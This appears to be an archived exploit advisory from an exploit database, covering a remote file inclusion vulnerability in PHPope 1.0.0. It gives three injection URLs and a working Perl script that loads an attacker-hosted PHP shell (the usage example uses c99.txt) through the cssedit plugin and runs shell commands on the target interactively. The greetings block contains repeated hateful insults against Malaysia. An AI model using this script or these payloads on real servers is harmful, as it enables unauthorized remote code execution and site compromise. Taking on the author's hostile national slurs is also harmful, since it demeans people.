######################################################################
#[x] PHPope <= 1.0.0 Multiple Remote File Include Vulnerability                    	  
#[!] Download Script      :  http://sourceforge.net/projects/phpope/files/                      		  
#[!] Author               :  cr4wl3r                                   		  
#[!] Contact              :  cr4wl3r[4t]linuxmail[dot]org              		  
#[!] Location             :  Gorontalo - INDONESIA                     		  
#[!] Dork                 :  "FuCk y0u MaLaYsia"   		  
######################################################################

#[x] 3xplo!t :                                                         		  
                                                                                  
#http://localhost/[path]/plugins/address/admin/index.php?GLOBALS[config][dir][plugins]=[AvriLhea]     
#http://localhost/[path]/plugins/im/compose.php?GLOBALS[config][dir][functions]=[AvriLhea]
#http://localhost/[path]/plugins/cssedit/admin/index.php?GLOBALS[config][dir][classes]=[AvriLhea]


#and many others

######################################################################
#[!] Greetz : MyMom [alm]  
#                                                                        
#[!] Special Thanks : str0ke, google, sourceforge, All MusLiM HacKers  
#
#[!] Thanks 2 : xoron, opt!x hacker, irvian, cyberlog
#
#[!] AlfaNet Cr3w GoRonTaLo : FaHry PunKs, RhyA HaMim, BoBy C00l, UyaN, ArYa.TaMa
#
#[!] My BiG BozZ MinJo.B0rj0e (YanG PunYa SepaRuH KaMpuNg Bugis, JaNgan LuPa Am-Am) :D
#
#[!] FuCk MaLaYsia, I HaTe MaLaYsia, h0w Ab0uT y0u??? 
#
#[!] sekuritionline.net | manadocoding.net                                          
######################################################################

# milw0rm.com [2009-09-03]




use LWP::UserAgent;
use HTTP::Request;
use LWP::Simple;
use Getopt::Long;

sub clear{
system(($^O eq 'MSWin32') ? 'cls' : 'clear');
}

&clear();

sub banner {
        &clear();
	print "[x] PHPope <= 1.0.0 Remote File Inclusion Exploit (III)\n\n";
	print "[x] Author: cr4wl3r\n";
	print "[x] Email: cr4wl3r[4t]linuxmail[dot]org\n";
	print "[x] Website: sekuritionline.net | manadocoding.net \n\n";
	print "[x] Location: Gorontalo - INDONESIA\n\n";
	print "[x] Coded by QUAKERDOOMER for WinAutoPWN\n";
	print "[x] http://solidmecca.co.nr\n";
	print "[x] (quakerdoomer [[<<at>>]] fmguy.com)\n\n";
	print "[+] Usage:\n";
	print "[+]     $0 -vuln \"web+path\" -shell \"shell\"\n";
	print "[+] eX: $0 -vuln \"http://www.someone.com/test/\" -shell \"http://someone.com/c99.txt?\"\n\n";
        exit();
}

my $options = GetOptions (
  'help!'            => \$help, 
  'vuln=s'            => \$vuln, 
  'shell=s'            => \$shell
  );

&banner unless ($vuln);
&banner unless ($shell);

&banner if $banner eq 1;

chomp($vuln);
chomp($shell);

while (){

	print "[shell]:~\$ ";
	chomp($cmd=<STDIN>);

	if ($cmd eq "exit" || $cmd eq "quit") {
		exit 0;
	}

	my $ua = LWP::UserAgent->new;
        $iny="?&act=cmd&cmd=" . $cmd . "&d=/&submit=1&cmd_txt=1";
        chomp($iny);
        my $own = $vuln . "/plugins/cssedit/admin/index.php?GLOBALS[config][dir][classes]=" . $shell . $iny;
        chomp($own);
	my $req = HTTP::Request->new(GET => $own);
	my $res = $ua->request($req);
	my $con = $res->content;
	if ($res->is_success){
		print $1,"\n" if ( $con =~ m/readonly> (.*?)\<\/textarea>/mosix);
	}
           else
             {
                print "[p0c] Exploit failed\n";
                exit(1);
             }
}

#bd0rk

